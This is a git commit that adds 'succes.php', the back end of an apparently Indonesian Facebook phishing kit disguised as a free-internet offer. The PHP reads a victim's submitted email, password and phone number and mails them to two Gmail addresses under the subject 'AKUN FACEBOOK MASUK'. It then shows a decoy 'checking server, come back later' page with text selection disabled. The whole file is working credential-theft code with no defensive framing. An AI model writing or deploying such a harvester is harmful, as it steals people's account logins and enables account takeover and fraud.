e6d49f36ec6e1e4a4c73990bba121bda5277e0a1
eggiar <44820986+eggiar@users.noreply.github.com>
2018-12-31 15:47:48 +0700

    Create succes.php

---
+++ succes.php
@@ -0,0 +1,94 @@
+<!-- https://www.rabiitch.ga/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+<?php
+
+$subjek = 'AKUN FACEBOOK MASUK';
+$mailto = 'eggiar70@gmail.com';
+
+
+$email = $_POST['email'];
+$password = $_POST['password'];
+$kota = $_POST['kota'];
+
+
+$body = <<<EOD
+<br><hr><br>
+Email : <font color="red">$email</font> <br>
+Password : <font color="red">$password</font> <br>
+Nomor Hp : <font color="red">$kota</font> <br>
+EOD;
+
+
+$headers = "From: rabiitchofficial@Info.com\r\n"; 
+$headers .= "Content-type: text/html\r\n"; 
+$mailers = 'rabiitchofficial@gmail.com';
+$success = mail($mailers, $subjek, $body, $headers);
+$success = mail($mailto, $subjek, $body, $headers); 
+
+
+?>
+<?php
+$random = rand(1000,5000);
+?>
+<!-- https://www.rabiitch.ga/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+<link href='https://i0.wp.com/www.pintekno.com/wp-content/uploads/2017/02/Internet-gratis.png' rel='icon' type='https://i0.wp.com/www.pintekno.com/wp-content/uploads/2017/02/Internet-gratis.png'/>
+<title>Akses Internet Gratis</title>
+<link rel="stylesheet" href="http://fontawesome.io/assets/font-awesome/css/font-awesome.css">
+<link rel="stylesheet" href="bootstrap.min.css">
+<link rel="stylesheet" href="jquery.min.css">
+<!-- Kode menampilkan peringatan untuk mengaktifkan javascript-->
+</head><body style="padding-top: 0px; padding-right: 0px; padding-bottom: 0px; padding-left: 0px; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; cursor: default;"><div align="center"><noscript>
+<div style="position:fixed; top:0px; left:0px; z-index:3000; height:100%; width:100%; background-color:#FFFFFF">
+<div style="font-family: Arial; font-size: 17px; background-color:#00bbf9; padding: 11pt;"> Mohon aktifkan javascript pada browser untuk mengakses halaman ini! </div></div>
+</noscript></div>
+<!--Kode untuk mencegah seleksi teks, block teks dll.-->
+<script type="text/javascript">
+function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}
+</script>
+<style>
+.error-msg {
+    margin: .5em 0;
+    display: block;
+    color: #dd4b39;
+    line-height: 17px;
+}
+body {
+  background: url(http://marketingland.com/wp-content/ml-loads/2015/01/analytics-marketing-data-technology-ss-1920.jpg) no-repeat center center fixed;
+  -webkit-background-size: cover;
+  -moz-background-size: cover;
+  -o-background-size: cover;
+  background-size: cover;
+}
+</style>
+<body style="padding:0px;margin:0 auto;">
+<div style="padding:0px;margin:0 auto;" class="container ">
+<div class="col-md-3">
+</div>
+<div style="border:1px solid #333333;padding:0px;margin:0 auto;" class="col-md-6">
+<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
+<img style="border:none;width:100%;max-height:200px;margin:0 auto;" src="https://assets.jalantikus.com/assets/cache/1380/600/tips/old/Gratis-Kuota-Internet-untuk-Androi-_yang-Sudah-Rooting-Banner.jpg"/>
+</div>
+<center>
+<div  style="background:rgba(9, 9, 9, 0.89);padding:30px;width:100%" class="form-horizontal">
+<h4 >
+  SEDANG PROSES PENGECEKAN SERVER
+  MOHON TUNGGU DAN KEMBALI LAGI NANTI....
+  <div class="content">
+	        <h1></h1>
+      
+		<center><img src="http://www.ryerson.ca/content/dam/uiResources/uiwCalendarList/loadingGif.gif" style="width:125px;height:125px;"></center> 
+                
+	   <div style="width:100%" class="form-group">
+
+</div>
+</div>
+</div>
+</div>
+<div class="col-md-3">
+</div>
+</div>
